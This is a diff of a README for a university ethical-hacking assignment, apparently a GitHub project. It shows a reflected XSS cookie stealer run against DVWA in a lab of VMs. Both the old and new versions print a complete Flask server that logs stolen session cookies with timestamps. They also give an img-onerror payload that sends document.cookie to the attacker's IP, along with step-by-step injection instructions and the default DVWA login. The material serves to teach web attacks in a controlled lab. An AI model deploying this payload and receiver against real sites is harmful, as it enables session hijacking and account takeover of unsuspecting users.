@@ -1,119 +1,120 @@
 # Cookie-Stealer
 
-Q2 – Cookie Stealer (CSCI369 Ethical Hacking Assignment)
+🕵️ Cookie Stealer via Reflected XSS | CSCI369 Ethical Hacking Assignment (Q2)
+This project demonstrates a reflected XSS attack to steal session cookies from a vulnerable web application (DVWA) and send them to a Flask server running on the attacker's Kali Linux machine.
 
-Description:
--------------
-This project demonstrates a reflected XSS attack to steal a session cookie from a vulnerable web application (DVWA) and send it to a Flask server running on the attacker machine (Kali Linux). The stolen cookie is saved with a timestamp into a file called cookies.txt.
+📘 Assignment Objective
+"Write a Python program to receive a session cookie via a JavaScript XSS injection and save it with a timestamp. Use Flask on Kali to log cookies sent from DVWA (on Meta2)."
 
-Environment Setup:
---------------------
-Attacker: Kali Linux (IP: 10.0.2.15)
-Victim: Meta2 VM (IP: 10.0.2.4)
-Target Web App: DVWA (Damn Vulnerable Web App), accessible at http://10.0.2.4/dvwa
+💻 What This Project Does
+This project performs a simulated XSS attack in a controlled lab setup. You inject JavaScript into DVWA (hosted on Meta2) that runs in the victim’s browser and sends `document.cookie` to a Flask server running on Kali Linux. The Flask app listens on port 8080 and writes the stolen cookie to a file with a timestamp.
 
-All VMs should be on the same NAT network and able to ping each other.
+🧪 Lab Setup
+VM              Role            Example IP
+-------------   --------------  -----------------
+Kali Linux      Attacker        10.0.2.15
+Meta2 (DVWA)    Victim          10.0.2.4
 
-Files in this folder:
-----------------------
-1. stealer.py         - Python Flask web server that logs stolen cookies
-2. xss_payload.txt    - JavaScript payload used for the XSS injection
-3. README.txt         - This file (setup guide and explanation)
+🔧 How to Run the Flask Server
+💡 Prerequisites
+- Kali Linux VM with Python 3 and Flask installed
+- Meta2 VM with DVWA accessible at http://10.0.2.4/dvwa
+- Both VMs on the same NAT network
 
-==============================
-📄 stealer.py (Flask Server)
-==============================
+▶️ Flask Setup (on Kali)
+```bash
+sudo apt update
+sudo apt install python3-venv -y
+
+mkdir ~/myproject
+cd ~/myproject
+python3 -m venv venv
+source venv/bin/activate
+pip install Flask
+
+# Save the stealer.py file below and run it:
+python3 stealer.py
+```
+
+📄 Flask Code (stealer.py)
+```python
 # ================================================
 # 🍪 Cookie Stealer Flask Server – CSCI369 Assignment Q2
 # Sheethal Santhanam (Kali IP: 10.0.2.15)
 # Description:
-# This Python Flask server runs on the Kali VM (attacker).
-# It receives session cookies sent via a reflected XSS payload injected into DVWA.
-# Received cookies are stored in cookies.txt with a timestamp.
+# This Flask app runs on the attacker's Kali VM.
+# It receives cookies via an XSS payload from DVWA (Meta2 VM),
+# then logs those cookies with a timestamp to cookies.txt.
 # ================================================
 
-from flask import Flask, request             # Flask = lightweight Python web framework
-from datetime import datetime               # Used to add a timestamp to each stolen cookie
+from flask import Flask, request              # Flask handles incoming web requests
+from datetime import datetime                 # Used to generate timestamps
 
-# Create a new Flask app instance
+# Initialize the Flask application
 app = Flask(__name__)
 
-# Define route '/' – this receives incoming GET requests
+# Define a route to receive GET requests at the root URL ("/")
 @app.route('/')
 def steal_cookie():
-    # Get the 'cookie' parameter from the URL (e.g. ?cookie=PHPSESSID=abc123)
+    # Try to extract the 'cookie' parameter from the URL query string
     cookie = request.args.get('cookie')
 
+    # If a cookie value is received, process it
     if cookie:
-        # Get current timestamp (formatted)
+        # Get the current date and time in a readable format
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-        # Write the stolen cookie and timestamp to cookies.txt
+        # Append the cookie and timestamp to a file named cookies.txt
         with open("cookies.txt", "a") as f:
             f.write(f"[{timestamp}] Cookie: {cookie}\n")
 
-        return "Cookie received!"  # Response for testing
-    return "No cookie found."      # Response if no parameter was provided
+        # Send a basic response (victim won't see this during attack)
+        return "Cookie received!"
 
-# Start the Flask server
-# host='0.0.0.0' makes it accessible from other machines (Meta2 VM)
-# port=8080 is the attacker's listening port
+    # If no cookie parameter was found in the request
+    return "No cookie found."
+
+# Start the Flask server:
+# - host='0.0.0.0' allows connections from outside (Meta2 VM)
+# - port=8080 is the server port the attacker listens on
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
+```
 
-==============================
-📄 xss_payload.txt (JavaScript Payload)
-==============================
+💉 JavaScript XSS Payload (xss_payload.txt)
+```html
 <img src=x onerror="new Image().src='http://10.0.2.15:8080/?cookie='+document.cookie;">
+```
 
-==============================
-🛠 Instructions to Run
-==============================
-1. Set up Flask server on Kali:
-   sudo apt update
-   sudo apt install python3-venv -y
-   mkdir ~/myproject
-   cd ~/myproject
-   python3 -m venv venv
-   source venv/bin/activate
-   pip install Flask
+📌 How to Test the Cookie Stealing Attack
+1. Run Flask server on Kali
+2. Visit DVWA at http://10.0.2.4/dvwa (from Kali browser)
+3. Login: admin / password
+4. Set DVWA Security to "Medium"
+5. Navigate to "XSS (Reflected)"
+6. Paste the payload above and click Submit
+7. In another Kali terminal:
+```bash
+cd ~/myproject
+cat cookies.txt
+```
+✅ You should see something like:
+```
+[2025-07-25 18:43:01] Cookie: PHPSESSID=xyz123; security=medium
+```
 
-   Save stealer.py in this folder
-   Run the server:
-   
-   python3 stealer.py
+🧠 How It Works
+- The JavaScript runs inside DVWA and extracts `document.cookie`
+- It silently sends the cookie via HTTP GET to the attacker’s Flask server
+- The server logs the cookie in `cookies.txt` with a timestamp
 
-3. Access DVWA from Kali browser:
-   Visit: http://10.0.2.4/dvwa
-   Login with: admin / password
-   Set security to: Medium
-   Navigate to: XSS (Reflected)
+📁 Folder Structure
+Q2/
+├── stealer.py         # Flask server script
+├── xss_payload.txt    # Final JavaScript payload
+├── README.txt         # This file
 
-4. Inject the payload from xss_payload.txt into the input field and click Submit.
-
-5. To check if the cookie was received:
-   cd ~/myproject
-   cat cookies.txt
-
-   Example output:
-   [2025-07-25 18:43:01] Cookie: PHPSESSID=xyz123; security=medium
-
-==============================
-ℹ️ How It Works
-==============================
-- The attacker injects JavaScript that grabs document.cookie.
-- It sends the cookie to the attacker's Flask server via HTTP GET.
-- Flask receives it and saves it in cookies.txt with a timestamp.
-
-==============================
-⚠️ Disclaimer
-==============================
-This project is for academic and ethical hacking purposes only. Do not use these techniques on real systems without permission. Unauthorized hacking is illegal.
-
-
-Assignment Requirements Covered:
------------------------------------
-- Flask app to receive and log cookies ✔
-- Timestamp using datetime module ✔
-- Final XSS payload in text file ✔
-- Tested on DVWA with "Medium" security ✔
+🛑 Disclaimer
+This project is for educational purposes only in a controlled lab environment.
+Never perform XSS attacks on real-world systems.
+Unauthorized access is illegal.
